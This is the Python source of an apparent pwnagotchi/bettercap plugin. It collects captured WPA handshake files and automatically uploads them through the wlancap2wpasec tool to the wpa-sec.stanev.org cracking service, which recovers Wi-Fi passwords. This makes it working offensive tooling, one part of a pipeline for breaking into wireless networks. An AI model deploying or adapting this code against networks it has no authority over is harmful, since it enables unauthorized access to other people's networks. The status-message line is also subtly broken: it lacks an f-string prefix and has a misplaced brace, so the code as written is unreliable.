__author__ = '33197631+dadav@users.noreply.github.com'
__version__ = '1.0.0'
__name__ = 'wpa_sec'
__license__ = 'GPL3'
__description__ = 'This plugin automatically uploades handshakes to https://wpa-sec.stanev.org'
__enabled__ = False

import os
import logging
import subprocess

READY = False
API_KEY = None
ALREADY_UPLOADED = None

# INSTALLATION:
## apt-get install libcurl4-openssl-dev
## https://github.com/ZerBea/hcxtools.git
## cd hcxtools; gcc wlancap2wpasec.c -o wlancap2wpasec -lcurl
## mv wlancap2wpasec /usr/bin/

def on_loaded():
    global READY
    global API_KEY
    global ALREADY_UPLOADED

    if not API_KEY:
        logging.error("WPA_SEC: API-KEY isn't set. Can't upload to wpa-sec.stanev.org")
        return

    try:
        subprocess.call("wlancap2wpasec -h >/dev/null".split(), stdout=open(os.devnull, 'wb'))
    except OSError:
        logging.error("WPA_SEC: Can't find wlancap2wpasec. Install hcxtools to use this plugin!")
        return

    try:
        with open('/root/.wpa_sec_uploads', 'r') as f:
            ALREADY_UPLOADED = f.read().splitlines()
    except OSError:
        logging.error('WPA_SEC: No upload-file found.')
        ALREADY_UPLOADED = []

    READY = True


def _upload_to_wpasec(path):
    try:
        subprocess.call(f"wlancap2wpasec -k {API_KEY} {path}".split(), stdout=open(os.devnull, 'wb'))
    except OSError as os_e:
        logging.error(f"WPA_SEC: Error while uploading {path}")
        raise os_e

# called in manual mode when there's internet connectivity
def on_internet_available(display, config, log):
    if READY:

        handshake_dir = config['bettercap']['handshakes']
        handshake_filenames = os.listdir(handshake_dir)
        handshake_paths = [os.path.join(handshake_dir, filename) for filename in handshake_filenames]
        handshake_new = set(handshake_paths) - set(ALREADY_UPLOADED)

        if handshake_new:
            logging.info("Internet connectivity detected.\
                          Uploading new handshakes to wpa-sec.stanev.org")

            for idx, handshake in enumerate(handshake_new):
                display.set('status', "Uploading handshake to wpa-sec.stanev.org ({idx + 1}/{len(handshake_new})")
                display.update(force=True)
                try:
                    _upload_to_wpasec(handshake)
                    ALREADY_UPLOADED.append(handshake)
                    with open('/root/.wpa_sec_uploads', 'a') as f:
                        f.write(handshake + "\n")
                except OSError:
                    pass
